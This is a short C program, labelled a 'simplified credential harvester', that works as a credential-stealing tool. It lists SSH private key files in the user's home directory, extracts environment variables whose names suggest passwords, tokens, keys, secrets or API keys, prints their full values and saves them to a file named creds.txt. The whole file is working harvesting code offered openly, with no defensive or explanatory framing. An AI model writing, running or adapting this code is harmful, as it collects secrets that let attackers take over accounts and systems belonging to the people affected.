/* Simplified credential harvester for compilation */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <pwd.h>

typedef struct {
    char type[32];
    char username[256];
    char value[256];
    char source[256];
} credential_t;

credential_t creds[100];
int cred_count = 0;

void add_cred(const char* type, const char* user, const char* value, const char* source) {
    if (cred_count >= 100) return;
    credential_t* c = &creds[cred_count++];
    strncpy(c->type, type, 31);
    strncpy(c->username, user, 255);
    strncpy(c->value, value, 255);
    strncpy(c->source, source, 255);
    printf("[+] Found: %s - %s (%s)\n", type, user, source);
}

void harvest_ssh() {
    struct passwd* pw = getpwuid(getuid());
    if (!pw) return;
    
    char path[512];
    snprintf(path, sizeof(path), "%s/.ssh", pw->pw_dir);
    
    DIR* dir = opendir(path);
    if (!dir) return;
    
    struct dirent* entry;
    while ((entry = readdir(dir))) {
        if (strstr(entry->d_name, "id_") == entry->d_name) {
            char fullpath[1024];
            snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
            add_cred("SSH_KEY", pw->pw_name, entry->d_name, fullpath);
        }
    }
    closedir(dir);
}

void harvest_env() {
    extern char** environ;
    const char* keywords[] = {"PASS", "TOKEN", "KEY", "SECRET", "API", NULL};
    
    for (char** env = environ; *env; env++) {
        for (int i = 0; keywords[i]; i++) {
            if (strstr(*env, keywords[i])) {
                add_cred("ENV_VAR", "current_user", *env, "environment");
                break;
            }
        }
    }
}

int main() {
    printf("=== Credential Harvester ===\n");
    harvest_ssh();
    harvest_env();
    printf("\nFound %d credentials\n", cred_count);
    
    FILE* fp = fopen("creds.txt", "w");
    if (fp) {
        for (int i = 0; i < cred_count; i++) {
            fprintf(fp, "%s|%s|%s|%s\n", 
                creds[i].type, creds[i].username, creds[i].value, creds[i].source);
        }
        fclose(fp);
        printf("Saved to creds.txt\n");
    }
    return 0;
}
